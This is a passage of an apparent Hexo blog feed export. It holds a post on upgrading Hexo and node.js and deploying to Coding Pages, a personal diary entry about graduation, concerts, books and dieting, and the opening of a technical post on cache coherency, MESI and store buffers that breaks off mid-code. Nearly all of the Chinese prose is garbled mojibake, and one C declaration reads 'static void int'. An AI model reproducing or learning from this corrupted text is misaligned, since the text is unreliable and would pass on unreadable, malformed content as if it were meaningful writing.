<h2 id="ä¸€äº›å‘"><a href="#ä¸€äº›å‘" class="headerlink" title="ä¸€äº›å‘"></a>ä¸€äº›å‘</h2><p>å†å²æ£€éªŒå‘Šè¯‰æˆ‘ä»¬ï¼Œç†è®ºè¦è·Ÿå®é™…ç›¸ç»“åˆï¼Œç†æƒ³æ˜¯ç¾å¥½çš„ç°å®æ˜¯æ®‹é…·çš„ã€‚æ›´æ¢ä¸»é¢˜è¿‡ç¨‹ä¸­å¾€å¾€ä¼šå‡ºç°ä¸€äº›æ„æ–™ä¹‹å¤–çš„é”™è¯¯ã€‚éƒ¨åˆ†é”™è¯¯å¯èƒ½æ˜¯ä¸»é¢˜æœ¬èº«æŸäº›é…ç½®å¼•èµ·çš„ï¼Œä¸€èˆ¬åœ¨è¯¥ä¸»é¢˜çš„å®˜ç½‘ä¼šæœ‰ç›¸åº” QAï¼Œä»”ç»†é˜…è¯»è¿™äº›å†…å®¹ä¼šå¾ˆæœ‰å¸®åŠ©ã€‚</p>
<p>ä½†ä¹Ÿæœ‰äº›é”™è¯¯å¯èƒ½ä¸ç”¨æˆ·è‡ªå·±çš„ hexoã€node.js ç‰ˆæœ¬ç­‰æœ‰å…³ï¼Œè¿™å°±éœ€è¦ä½ è‡ªå·±å»è°ƒæ•´ã€‚</p>
<h3 id="å‡çº§-Hexo"><a href="#å‡çº§-Hexo" class="headerlink" title="å‡çº§ Hexo"></a>å‡çº§ Hexo</h3><p>ä¸€äº›æ¯”è¾ƒæ–°çš„ä¸»é¢˜å¯èƒ½éœ€è¦æ–°ç‰ˆ hexo çš„æŸäº›ç‰¹æ€§æ‰èƒ½æ­£å¸¸å·¥ä½œï¼Œè€Œå¯¹äºç”¨æˆ·æ¥è¯´ä¸€èˆ¬å¾ˆå°‘ä¼šå»æ›´æ–°è‡ªå·±çš„ hexo ç‰ˆæœ¬ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬å…ˆå‡çº§è‡ªå·±çš„ hexoï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨æ·˜å®æºçš„ cnpm æ›¿æ¢ npm</span></span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">cnpm install -g cnpm                 <span class="comment"># å‡çº§ npm</span></span><br><span class="line">cnpm cache clean -f                 <span class="comment"># æ¸…é™¤ npm ç¼“å­˜</span></span><br><span class="line"></span><br><span class="line">===æ›´æ–° hexo: è¿›å…¥åšå®¢æ ¹ç›®å½•ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤=== </span><br><span class="line"><span class="comment"># æ›´æ–° package.json ä¸­çš„ hexo åŠä¸ªæ’ä»¶ç‰ˆæœ¬</span></span><br><span class="line">cnpm install -g npm-check           <span class="comment"># æ£€æŸ¥ä¹‹å‰å®‰è£…çš„æ’ä»¶ï¼Œéƒ½æœ‰å“ªäº›æ˜¯å¯ä»¥å‡çº§çš„ </span></span><br><span class="line">cnpm install -g npm-upgrade         <span class="comment"># å‡çº§ç³»ç»Ÿä¸­çš„æ’ä»¶</span></span><br><span class="line">npm-check</span><br><span class="line">npm-upgrade</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–° hexo åŠæ‰€æœ‰æ’ä»¶</span></span><br><span class="line">cnpm update</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¡®è®¤ hexo å·²ç»æ›´æ–°</span></span><br><span class="line">hexo -v</span><br></pre></td></tr></table></figure>

<h3 id="å‡çº§-node-js"><a href="#å‡çº§-node-js" class="headerlink" title="å‡çº§ node.js"></a>å‡çº§ node.js</h3><p>åŒç†ï¼Œæ–°ä¸»é¢˜å¯èƒ½ä¼šä½¿ç”¨æ–°ç‰ˆ node.js æä¾›çš„å‡½æ•°ç­‰ï¼Œç”¨æˆ·éœ€è¦æ›´æ–°è‡ªå·±çš„ node.jsã€‚Unix ç³»ç»Ÿå¯ä»¥ä½¿ç”¨ n æ¨¡å—å®Œæˆæ›´æ–°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install npm@latest -g <span class="comment"># å‡çº§ npm åˆ°æœ€æ–°ç‰ˆæœ¬</span></span><br><span class="line">sudo npm cache clean -f <span class="comment"># æ¸…æ¥š npm cache</span></span><br><span class="line">sudo npm install -g n <span class="comment"># å®‰è£… n æ¨¡å—</span></span><br><span class="line"></span><br><span class="line">sudo n stable <span class="comment"># å®‰è£… node.js æœ€æ–°çš„ç¨³å®šç‰ˆæœ¬</span></span><br><span class="line">sudo n 8.1.2 <span class="comment"># å®‰è£…æŒ‡å®šçš„ node.js ç‰ˆæœ¬</span></span><br></pre></td></tr></table></figure>

<p>windows ç³»ç»Ÿæš‚ä¸æ”¯æŒ n æ¨¡å—ã€‚å¯ä»¥åˆ° <a href="https://nodejs.org/en/">node.js å®˜ç½‘</a> å»ä¸‹è½½åˆé€‚çš„ msi åŒ…ã€‚</p>
<h2 id="éƒ¨ç½²åˆ°-Coding-Page"><a href="#éƒ¨ç½²åˆ°-Coding-Page" class="headerlink" title="éƒ¨ç½²åˆ° Coding Page"></a>éƒ¨ç½²åˆ° Coding Page</h2><p>å¦‚ä½•åˆ©ç”¨ hexo + Github Page æ­å»ºé™æ€åšå®¢è¿™ä¸ªé—®é¢˜å·²ç»æœ‰å¾ˆå¤šæ•™ç¨‹äº†ï¼Œä½†æ˜¯ç”±äºæŸäº›ä¼—æ‰€å‘¨çŸ¥çš„åŸå› å›½å†…ç”¨æˆ·å¯¹ Github Page çš„ä½“éªŒå¹¶ä¸é‚£ä¹ˆå¥½ã€‚è¿™æ—¶å€™ <a href="https://e.coding.net/login">Coding</a> å¯ä»¥ä½œä¸º Github çš„æ›¿ä»£å“ã€‚ä»¥å‰ç»å¸¸æœ‰äººåæ§½ Coding Page çš„æœåŠ¡è¿˜æ¯” GitHub Page è¿˜å·®ï¼Œä½†æœ€è¿‘ä¸¤å¹´å®ƒè¢«è…¾è®¯æ”¶è´­ä»¥åç‰¹åˆ«æ˜¯å¯¹å›½å†…ç”¨æˆ·çš„æœåŠ¡è´¨é‡æœ‰å¾ˆå¤§æå‡ã€‚æ‰€ä»¥æ¯”è¾ƒå¥½çš„æ–¹æ¡ˆæ˜¯å›½å¤–æµé‡èµ° Githubï¼Œå›½å†…æµé‡èµ° Codingã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ç”¨è‡ªå·±çš„æœåŠ¡å™¨ï¼Œä¸åšè®¨è®ºã€‚è¿™é‡Œç»™å‡ºä¸€ä¸ªçŸ¥ä¹ä¸Šçš„<a href="https://zhuanlan.zhihu.com/p/111608743?from_voters_page=true">æ•™ç¨‹</a>ã€‚</p>
]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ«æ‘¸é±¼å•¦~</title>
    <url>/2021/05/16/%E4%B8%80%E7%82%B9%E5%B0%8F%E6%83%B3%E6%B3%95/</url>
    <content><![CDATA[<p>å…³äºæˆ‘åœ¨å­¦æ ¡æ‘¸é±¼åŠå¹´æƒŠåèµ·ï¼Œé¥æœ›å¤§ä½¬åˆä¸€å¹´è¿™ä»¶äº‹ã€‚</p>
<span id="more"></span>

<p>ä»Šå¤©æ¯•ä¸šè®¾è®¡å’Œè¾…ä¿®ç»“è¯¾çš„äº‹æƒ…æš‚å‘Šä¸€æ®µè½ï¼Œå‘ç°è‡ªå·±ä¸Šä¸€æ¬¡æ›´æ–°åšå®¢æ˜¯å››ä¸ªæœˆå‰äº†ï¼Œé¡¿æ—¶ç¾æ„§åœ°ä½ä¸‹äº†å¤´ã€‚</p>
<h2 id="æœ€è¿‘åœ¨åšäº›ä»€ä¹ˆ"><a href="#æœ€è¿‘åœ¨åšäº›ä»€ä¹ˆ" class="headerlink" title="æœ€è¿‘åœ¨åšäº›ä»€ä¹ˆ"></a>æœ€è¿‘åœ¨åšäº›ä»€ä¹ˆ</h2><p>å…¶å®æœ¬æ¥è¿™ä¸ªæ ‡é¢˜æˆ‘æ˜¯æƒ³èµ·â€œæœ€è¿‘åœ¨å¿™äº›ä»€ä¹ˆâ€ï¼Œæƒ³äº†æƒ³å¥½åƒä¹Ÿæ²¡å¹²å•¥äº‹ï¼Œå®åœ¨ç§°ä¸ä¸Šå¿™ã€‚å››æœˆä»½ä»¥æ¥ä¸€ç›´åœ¨åšæ¯•è®¾ï¼Œåˆšå¼€å§‹è¿˜è§‰å¾—æœ‰ç‚¹æ„æ€å¹²åŠ²åè¶³ï¼ŒåŠä¸ªæœˆä¹‹åæ–°é²œåŠ²å„¿ä¸€è¿‡å°±ä¸è€çƒ¦äº†ï¼Œéšä¾¿ææåº”ä»˜äº†äº‹ã€‚ä¸­é—´æ–­æ–­ç»­ç»­çœ‹äº†ç‚¹ã€ŠLinuxé«˜æ€§èƒ½æœåŠ¡å™¨ç¼–ç¨‹ã€‹ï¼Œç…§ç€åˆ«äººçš„ä»£ç è‡ªå·±å†™ç‚¹å°ç©å…·ã€‚å­¦ä¹ ä¸Šçš„äº‹å¥½åƒå°±è¿™æ ·äº†ã€‚</p>
<p>ç”Ÿæ´»ä¸Šä¹Ÿæ²¡ä»€ä¹ˆå¤ªå¤§å˜åŒ–ï¼Œä¾æ—§æ˜¯ä¸æ€ä¹ˆå‡ºå»ç©ï¼Œå€’ä¸æ˜¯ä¸æƒ³åŠ¨ï¼Œåªæ˜¯æ¯æ¬¡åŠ¨äº†å‡ºå»è½¬è½¬çš„å¿µå¤´æœ€åå…³å¤´åˆçªç„¶è§‰å¾—æ²¡ä»€ä¹ˆæ„æ€å°±æ”¾å¼ƒäº†ï¼Œå¥½å‡ æ¬¡éƒ½èµ°åˆ°æ ¡é—¨å£äº†åˆæŠ˜è¿”å›æ¥ã€‚åœ¨å­¦æ ¡é‡Œåˆ·åˆ· B ç«™ï¼Œçœ‹çœ‹å¥ˆé£ï¼Œæ™šä¸Šå–ç‚¹å°é…’ï¼Œä¸€å¤©å°±è¿™ä¹ˆç¨€é‡Œç³Šæ¶‚è¿‡å»äº†ã€‚è¯´èµ·æ¥æœ€è¿‘å–œæ¬¢ä¸Šå–å¨å£«å¿Œï¼Œè€Œä¸”æ¯”èµ·æ³¢æœ¬ï¼Œè°ƒå’Œå¨å£«å¿Œæ›´å¯¹æˆ‘èƒƒå£ã€‚æ³¢æœ¬æ€»æ˜¯ç»™æˆ‘ä¸€ç§å®¶é‡Œé•¿è¾ˆæ³¡çš„è¯é…’å‘³ï¼Œå¾—å…‘ç‚¹æ°´æ‰æ–¹ä¾¿å…¥å£ã€‚</p>
<p>ç²¾ç¥æ–¹é¢ï¼Œè¿™å­¦æœŸä»¥æ¥çœ‹äº†ä¸‰åœº liveï¼Œåˆ†åˆ«æ˜¯å¸†å¸ƒå°é•‡+ç»“å†°æ°´+æ¸©å’Œæ²»ç–—çš„æ‹¼ç›˜ã€åå…‰é•œå’Œéœ“è™¹èŠ±å›­ã€‚å¹´åˆåœ¨å®¶é‡Œç»å¸¸å¬ç»“å†°æ°´ï¼Œæ‰€ä»¥åæ¥æŠŠä¹è¿çœŸäººçš„ç¥¨å‡ºäº†å»çœ‹ä»–ä»¬ï¼Œæ²¡æƒ³åˆ°ç°åœºè®©æˆ‘å¤§å¤±æ‰€æœ›â€¦â€¦ä¸»å”±æ°”æ¯ä¸è¶³ä¸”å…¨ç¨‹æ”¾ programï¼Œä¹é˜Ÿçš„æ§åœºèƒ½åŠ›ä¹Ÿä¸è¡Œã€‚é‚£åœº live ä¹‹åå¥½é•¿ä¸€æ®µæ—¶é—´é‡Œæˆ‘éƒ½ä¸æ„¿æ„å†å»å¬ä»–ä»¬çš„æ­Œäº†ã€‚ç›¸æ¯”ä¹‹ä¸‹åå…‰é•œä¸æ„§æ˜¯ä¸­å›½è€ç‰Œæœ‹å…‹ä¹é˜Ÿï¼Œæ— è®ºæ˜¯æŠ€æœ¯è¿˜æ˜¯å¸¦åŠ¨æ°”æ°›çš„èƒ½åŠ›éƒ½å‡ºç±»æ‹¨èƒï¼Œç¬¬ä¸€æ¬¡æœ‰çœ‹ live çœ‹åˆ°ç¼ºæ°§çš„æ„Ÿè§‰ã€‚éœ“è™¹èŠ±å›­çš„ç°åœºå‘æŒ¥ä»¤äººå½±å“æ·±åˆ»ï¼ŒåŒæ—¶å¸¦ç€å¹´è½»äººç«ä¸€æ ·çš„çƒ­æƒ…ã€‚ä¸æ™šçš„åœºåœ°å’Œç¯å…‰éƒ½å¾ˆæ£’ã€‚è¿™é‡Œè¿˜è¦é­å°¸ä¸€ä¸‹ voxï¼ŒçœŸè¯¥å¥½å¥½è£…ä¿®ä¸€ä¸‹äº†ï¼Œä¸ç„¶æ€ä¹ˆè·Ÿä¸æ™šè¿™ç§æ–°ç§€ç«äº‰å“Ÿã€‚è¿˜çœ‹äº†ä¸¤æœ¬æ— å…³æŠ€æœ¯çš„ä¹¦ï¼Œåˆ†åˆ«æ˜¯ç½—ç¿”è€å¸ˆçš„ã€Šåœ†åœˆæ­£ä¹‰ã€‹å’ŒåŠ è«å¤«çš„ã€Šä»ä¸€åˆ°æ— ç©·å¤§ã€‹ã€‚ã€Šåœ†åœˆæ­£ä¹‰ã€‹ä»ä¸€ä¸ªæ³•å¾‹äººçš„è§’åº¦è§£è¯»æ­£ä¹‰ã€ç”Ÿå‘½å’Œå­¦ä¹ ï¼Œä»–è®¤ä¸ºæ­£ä¹‰å°±åƒæ˜¯ä¸€ä¸ªç»å¯¹çš„åœ†ï¼Œæ˜¯æ°¸è¿œæ— æ³•è¾¾åˆ°çš„ï¼Œä½†æˆ‘ä»¬å¿…é¡»ä¿æŒä¸€é¢—è¿½æ±‚æ­£ä¹‰çš„å¿ƒã€‚è¿™å°±åƒä¸€å¥æˆ‘ä¸€ç›´å¾ˆå–œæ¬¢çš„è¯ï¼šé«˜å±±ä»°æ­¢ï¼Œæ™¯è¡Œè¡Œæ­¢ï¼›è™½ä¸èƒ½è‡³ï¼Œå¿ƒå‘å¾€ä¹‹ã€‚ã€Šä»ä¸€åˆ°æ— ç©·å¤§ã€‹åˆ™æ˜¯ä¸€æœ¬å……æ»¡è¶£å‘³çš„ç§‘æ™®ä¹¦ï¼Œé‡Œé¢å·§å¦™åœ°è¯æ˜ä¸€æ ¹çº¿æ®µä¸Šçš„ç‚¹æ¯”å…¨ä½“æ•´æ•°æ›´å¤šè¿™ä¸ªè¿‡ç¨‹è®©æˆ‘å¤§å¼€çœ¼ç•Œã€‚è¯´å®è¯æ„Ÿè§‰è‡ªå·±è¯»çš„ä¹¦è¿˜æ˜¯å¤ªå°‘äº†ï¼Œå…¶å®é‡‘èç»æµã€å†å²æ”¿æ²»è¿™äº›å†…å®¹æˆ‘éƒ½æ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œä½†å°±æ˜¯é™ä¸ä¸‹å¿ƒæ¥å¥½å¥½å­¦ä¹ ã€‚æœ€è¿‘æƒ³å†è¯»ä¸€éã€Šç¨€ç¼ºâ€”â€”æˆ‘ä»¬æ˜¯å¦‚ä½•é™·å…¥è´«ç©·ä¸å¿™ç¢Œçš„ã€‹ï¼Œè¿™æœ¬ä¹¦å¼—å…°å…‹æ¨åœ¨çŸ¥ä¹æ¨èå¾ˆå¤šæ¬¡äº†ï¼Œé‡Œé¢æå‡ºâ€œå¿ƒæ™ºå¸¦å®½â€çš„æ¦‚å¿µä»¤æˆ‘å°è±¡æ·±åˆ»ã€‚äººçš„æ³¨æ„åŠ›æ˜¯æœ‰é™çš„ï¼Œåšäº†è¿™ä»¶äº‹å°±æ²¡æœ‰æ›´å¤šçš„ç²¾åŠ›å»åšå¦ä¸€ä»¶äº‹ï¼Œå¦‚æœèƒ½å°½æ—©å®‰æ’å¥½åƒä»Šå¤©åƒä»€ä¹ˆç©¿ä»€ä¹ˆä¹‹ç±»çš„çäº‹å°±èƒ½èŠ‚çœä¸‹å®è´µçš„åˆ¤æ–­åŠ›ç»™æ›´é‡è¦çš„ä¸œè¥¿ã€‚å½“ç„¶ä¹Ÿä¸æ˜¯è¯´åƒä»€ä¹ˆæ˜¯ä¸é‡è¦çš„ï¼Œäººæ´»ä¸€ä¸–ï¼Œå£è…¹ä¹‹æ¬²æ˜¯æœ€ç®€å•æœ€ç›´æ¥çš„å¹¸ç¦æ¥æºã€‚æœ€å¥½æ˜¯æå‰æŠŠè¿™æ®µæ—¶é—´æƒ³åƒçš„ä¸œè¥¿å®šä¸‹æ¥ã€‚</p>
<p>æœ€è¿‘ä¸€ä¸ªæœˆç¨å¾®å‡äº†ä¸‹è‚¥ï¼Œç›®å‰ä¸ºæ­¢å¤§æ¦‚ç˜¦äº†8æ–¤è¿™æ ·ã€‚ä¹Ÿæ²¡æœ‰ç‰¹æ„åŠ å¼ºè¿åŠ¨ï¼Œå…³é”®å°±æ˜¯å°‘åƒç¢³æ°´ã€‚åˆé¤ä¸»é£Ÿå‡åŠ + æ™šé¤æ‹’ç»ä¸»é£Ÿï¼Œä¿æŒæ¸…æ·¡é¥®é£Ÿï¼Œè‚‰å’Œè›‹å¯ä»¥å¤šåƒã€‚ä¸œäºšäººè¢«æ­§è§†ä½“è´¨ä¸è¡Œå°±æ˜¯è‚‰è›‹å¥¶åƒå¤ªå°‘äº†ï¼Œæ•´å¤©åƒé‚£äº›ç¢³æ°´é™¤äº†å¢åŠ æ‚£ä¸Šé«˜è¡€ç³–çš„å‡ ç‡åˆ«çš„å•¥ç”¨æ²¡æœ‰ã€‚æ²¡ä¸œè¥¿åƒåªå¥½å¤šå¹²å‡ ç¢—é¥­å¡«è‚šå­çš„æ—¶ä»£å·²ç»è¿‡å»äº†ï¼Œæ²¡å¿…è¦ä¸€é¡¿é¥­è¿˜å’”å’”é€ é‚£ä¹ˆå¤šç±³é¢åŒ…å­ã€‚</p>
<p>å¸Œæœ›æœªæ¥èƒ½çœ‹æ›´å¤šç²¾å½©çš„æ¼”å‡ºï¼Œè®¤è¯†æ›´å¤šæœ‰è¶£çš„äººï¼Œå­¦ä¹ æ›´å¤šå–œæ¬¢çš„çŸ¥è¯†ã€‚</p>
<!--## ç¨å¾®å±•æœ›ä¸€ä¸‹æœªæ¥

è¿˜æœ‰ä¸åˆ°ä¸¤ä¸ªæœˆæˆ‘çš„å­¦ç”Ÿç”Ÿæ¶¯å°±è¦ç»“æŸäº†ï¼Œè¯´å®è¯ä»èº«è¾¹æœ‹å‹çš„æƒ…å†µæ¥çœ‹ï¼Œç¤¾ç•œç”Ÿæ´»æ¯”æˆ‘æƒ³è±¡å¾—è¦æ›´è‰°éš¾ä¸€ç‚¹ã€‚é™¤äº†é’±ä»¥å¤–ï¼Œå­¤ç‹¬å’Œå‹åŠ›ä¹Ÿè®©å¾ˆå¤šåˆå…¥ç¤¾ä¼šçš„åº”å±Šç”Ÿå¦‚ç‰›è´Ÿé‡ã€‚èƒŒäº•ç¦»ä¹¡æ‰“å·¥çš„æ—¥å­ç¡®å®ä¸å¥½å—ï¼Œä¸è¿‡æˆ‘å¯¹è‡ªå·±çš„æŠ—å‹èƒ½åŠ›è¿˜æ˜¯æ¯”è¾ƒæœ‰ä¿¡å¿ƒã€‚æ€»ä¹‹ï¼Œæ”¾å¼ƒå¹»æƒ³ï¼Œå‡†å¤‡æˆ˜æ–—ï¼-->

<p><img src="https://i.loli.net/2021/05/16/v8LQPfKhXlb7mVG.jpg" alt="IMG_20210508_213917.jpg"></p>
]]></content>
      <categories>
        <category>æ—¥å¸¸</category>
      </categories>
      <tags>
        <tag>é—²èŠ</tag>
      </tags>
  </entry>
  <entry>
    <title>Cache Coherency and Memory Consistency</title>
    <url>/2021/01/20/Cache-Coherency-%E4%B8%8E-Memory-Consistency/</url>
    <content><![CDATA[<p><a href="http://qiuyueqy.com/2020/03/24/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B-%E4%BB%A5Go%E4%B8%BA%E4%BE%8B/">å¹¶å‘ç¼–ç¨‹-ä»¥Goä¸ºä¾‹</a>ä¸€æ–‡æ€»ç»“äº†å¹¶å‘ç¼–ç¨‹ä¸­å¸¸è§çš„ä¸¤ç§é”™è¯¯å¹¶ç»™å‡ºäº†è§£å†³ç­–ç•¥ã€‚æœ¬æ–‡æ—¨åœ¨ä»è®¡ç®—æœºä½“ç³»çš„è§’åº¦åˆ†æè¿™ä¸¤ç§é”™è¯¯å‡ºç°çš„åŸå› ã€‚</p>
<span id="more"></span>

<h2 id="ç¼“å­˜ä¸€è‡´æ€§-Cache-Coherency"><a href="#ç¼“å­˜ä¸€è‡´æ€§-Cache-Coherency" class="headerlink" title="ç¼“å­˜ä¸€è‡´æ€§(Cache Coherency)"></a>ç¼“å­˜ä¸€è‡´æ€§(Cache Coherency)</h2><p>åˆç§°<strong>ç¼“å­˜å¯è§æ€§</strong>ï¼Œç°ä»£è®¡ç®—æœºå­˜å‚¨ç³»ç»Ÿé‡‡ç”¨äº†åˆ†çº§æ¶æ„ï¼Œæ¯ä¸ª CPU å†…æ ¸æœ‰è‡ªå·±çš„ L1ã€L2 Cacheï¼Œç›¸äº’ä¹‹é—´è¿˜æœ‰ä¸€ä¸ªå…±äº«çš„ L3 Cacheï¼Œå…¶ä¸­ L1 è¿˜åˆ†ä¸ºç¼“å­˜æŒ‡ä»¤çš„ i-cache(åªè¯»)å’Œç¼“å­˜ç¨‹åºæ•°æ®çš„ d-cacheï¼ŒL2ã€L3 Cache åˆ™ä¸åŒºåˆ†æŒ‡ä»¤å’Œç¨‹åºæ•°æ®ï¼Œç§°ä¸ºç»Ÿä¸€ç¼“å­˜(unified cache)ã€‚è€Œå­—èŠ‚ä» Memory ç¼“å­˜åˆ° Cache çš„ç­–ç•¥åˆåˆ†ä¸º<strong>ç›´æ¥æ˜ å°„</strong>ã€<strong>å…¨ç›¸è”</strong>å’Œ<strong>ç»„ç›¸è”</strong>ä¸‰ç§ï¼Œæ­¤å¤„ä¸åšå±•å¼€ï¼š</p>
<p><img src="https://i.loli.net/2021/01/20/cAnCZgduros1mTY.png" alt="åˆ†çº§æ¶æ„"></p>
<p>åœ¨å¤šæ ¸æ—¶ä»£ï¼Œå‡è®¾æœ‰ä¸‹é¢è¿™ä¸€ä¸ªåœºæ™¯ï¼š</p>
<ol>
<li>CPU0 å’Œ CPU1 åœ¨å„è‡ªçš„ Cache æœ‰ä¸€ä»½å†…å­˜åœ°å€ä¸º 0x6324 çš„å€¼çš„å‰¯æœ¬ï¼Œæ¯”å¦‚è¿™ä¸ªä½ç½®å­˜æ”¾äº†å…¨å±€å˜é‡ a çš„å€¼ä¸º 0ï¼ŒCPU0 å’Œ CPU1 å„è‡ªç¼“å­˜äº†ä¸€ä¸ª 0</li>
<li>CPU0 è¦æŠŠ a çš„å€¼ä¿®æ”¹ä¸º 1ï¼Œäºæ˜¯ç›´æ¥åœ¨è‡ªå·±çš„ Cache é‡Œå¯¹ a è¿›è¡Œå†™æ“ä½œï¼ˆstoreï¼‰</li>
<li>CPU1 æ‰§è¡Œè¯»æ“ä½œï¼ˆloadï¼‰è¯»å– a çš„å€¼ï¼Œè¿™æ—¶å€™å®ƒè¯»ä»è‡ªå®¶ Cache é‡Œè¯»åˆ°çš„å®é™…ä¸Šæ˜¯ a çš„è¿‡æœŸå€¼ï¼ˆä»ä¸º 0ï¼‰</li>
</ol>
<p>è¿™å°±æ˜¯ä¸€ä¸ªç”±äºç¼“å­˜ä¸ä¸€è‡´å¼•å‘çš„é”™è¯¯ã€‚Cache è®¾è®¡çš„æœ€å¤§éš¾ç‚¹å…¶å®åœ¨äº Cache ä¸€è‡´æ€§: å³æ‰€æœ‰ CPU çœ‹åˆ°çš„æŒ‡å®šåœ°å€çš„å€¼æ˜¯ä¸€è‡´çš„ã€‚CPU å°è¯•ä¿®æ”¹æŸä¸ªåœ°å€å€¼æ—¶ï¼Œå…¶å®ƒ CPU å¯èƒ½å·²æœ‰è¯¥åœ°å€çš„ç¼“å­˜ï¼Œç”šè‡³å¯èƒ½ä¹Ÿåœ¨æ‰§è¡Œä¿®æ”¹æ“ä½œã€‚å› æ­¤è¯¥ CPU éœ€è¦å…ˆå¾æ±‚å…¶å®ƒ CPU çš„â€œåŒæ„â€ï¼Œæ‰èƒ½æ‰§è¡Œæ“ä½œã€‚è¿™éœ€è¦ç»™å„ä¸ª CPU çš„ Cache Line åŠ ä¸€äº›æ ‡è®°(çŠ¶æ€)ï¼Œè¾…ä»¥ CPU ä¹‹é—´çš„é€šä¿¡æœºåˆ¶(äº‹ä»¶)æ¥å®Œæˆã€‚è¿™å¯ä»¥é€šè¿‡ MESI åè®®æ¥å®Œæˆã€‚MESI æ˜¯ä»¥ä¸‹å››ä¸ªçŠ¶æ€çš„ç®€ç§°ï¼š</p>
<ul>
<li>M(modified): è¯¥è¡Œåˆšè¢« CPU æ”¹è¿‡ï¼Œå¹¶ä¸”ä¿è¯ä¸ä¼šå‡ºç°åœ¨å…¶å®ƒ CPU çš„ Cache Line ä¸­ã€‚å³ CPU æ˜¯è¯¥è¡Œå”¯ä¸€æ‰€æœ‰è€…</li>
<li>E(exclusive): å’Œ M ç±»ä¼¼ï¼Œä½†æ˜¯æœªè¢«ä¿®æ”¹ï¼Œå³å’Œå†…å­˜æ˜¯ä¸€è‡´çš„ï¼ŒCPU å¯ç›´æ¥å¯¹è¯¥è¡Œæ‰§è¡Œä¿®æ”¹(ä¿®æ”¹ä¹‹åä¸º modified çŠ¶æ€)ã€‚</li>
<li>S(shared): è¯¥è¡Œå†…å®¹è‡³å°‘è¢«ä¸€ä¸ªå…¶å®ƒ CPU å…±äº«ï¼Œå› æ­¤è¯¥ CPU ä¸èƒ½ç›´æ¥ä¿®æ”¹è¯¥è¡Œè€Œéœ€è¦å…ˆä¸å…¶å®ƒ CPU åå•†ï¼Œä½†å¯ä»¥ç›´æ¥è¯»</li>
<li>I(invalidated): è¯¥è¡Œä¸ºæ— æ•ˆè¡Œï¼Œå³ä¸ºå¯ä»¥è¢«å¡«å……çš„è¡Œï¼Œå‰é¢æåˆ° Cache ç­–ç•¥ä¼šä¼˜å…ˆå¡«å…… Invalid è¡Œã€‚</li>
</ul>
<p><img src="https://i.loli.net/2021/01/20/ZKIjdyxQvRimwnC.png" alt="MESIçŠ¶æ€æœº"></p>
<p>MESI åè®®è¶³å¤Ÿç®€å•ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ»¡è¶³æˆ‘ä»¬å¯¹ç¼“å­˜ä¸€è‡´æ€§çš„éœ€æ±‚ï¼Œå®ƒåœ¨å•ä¸ª CPU å¯¹æŒ‡å®šåœ°å€çš„åå¤è¯»å†™æ–¹é¢æœ‰å¾ˆå¥½çš„æ€§èƒ½è¡¨ç°ï¼Œä½†åœ¨æŸä¸ª CPU å°è¯•ä¿®æ”¹åœ¨å…¶å®ƒ CPU Cache Line ä¸­å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œæ€§èƒ½è¡¨ç°éå¸¸ç³Ÿç³•ã€‚ç¡¬ä»¶å·¥ç¨‹å¸ˆä¸ºäº†è¿½æ±‚æè‡´çš„æ€§èƒ½ï¼Œåœ¨ L1 Cache ä¹‹ä¸ŠåˆåŠ å…¥ä¸€çº§ç¼“å­˜ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º <code>store buffer</code>ã€‚store buffer å’Œ L1 Cache è¿˜æœ‰ç‚¹åŒºåˆ«ï¼Œ<strong>store bufferåªç¼“å­˜ CPU çš„å†™æ“ä½œ</strong>ã€‚store buffer è®¿é—®ä¸€èˆ¬åªéœ€è¦ 1 ä¸ªæŒ‡ä»¤å‘¨æœŸï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šé™ä½äº†å†…å­˜å†™å»¶è¿Ÿã€‚ä¸ç®¡ Cache æ˜¯å¦å‘½ä¸­ï¼ŒCPU éƒ½å°†æ•°æ®å†™å…¥ store bufferã€‚store buffer è´Ÿè´£åç»­ä»¥ FIFO æ¬¡åºå†™å…¥ L1 Cacheã€‚store buffer ä¸€èˆ¬åªæœ‰å‡ åä¸ªå­—èŠ‚ï¼Œå’Œ L1 Cacheç›¸æ¯”æ˜¯å°å·«è§å¤§å·«äº†ã€‚</p>
<p><img src="https://i.loli.net/2021/01/20/EUBrteHac7OJhsz.png" alt="store buffer"></p>
<p>å­˜åœ¨ store buffer çš„æƒ…å†µä¸‹ã€‚<strong>é’ˆå¯¹å†™æ“ä½œ</strong>ï¼ŒCPU ç›´æ¥æŠŠæ•°æ®æ‰”ç»™ store bufferã€‚åç»­ store buffer è´Ÿè´£<strong>ä»¥ FIFO æ¬¡åºå†™å› L1 Cache</strong>ã€‚è¿™ä¼šå¯¹æˆ‘ä»¬çš„ç¨‹åºäº§ç”Ÿä»€ä¹ˆå½±å“å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä»£ç ä¸€</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> r1, r2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="keyword">int</span> <span class="title">thread_cpu0</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        x = <span class="number">1</span>;    <span class="comment">/* A */</span></span><br><span class="line">        r1 = y;   <span class="comment">/* B */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span 